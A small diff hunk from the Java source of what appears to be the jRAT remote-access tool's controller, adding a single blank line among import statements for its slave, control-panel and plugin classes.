@@ -3,6 +3,7 @@ package jrat.controller.packets.incoming;
 import jrat.controller.Slave;
 import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelControlLoadedPlugins;
+
 import java.io.DataInputStream;
 
 
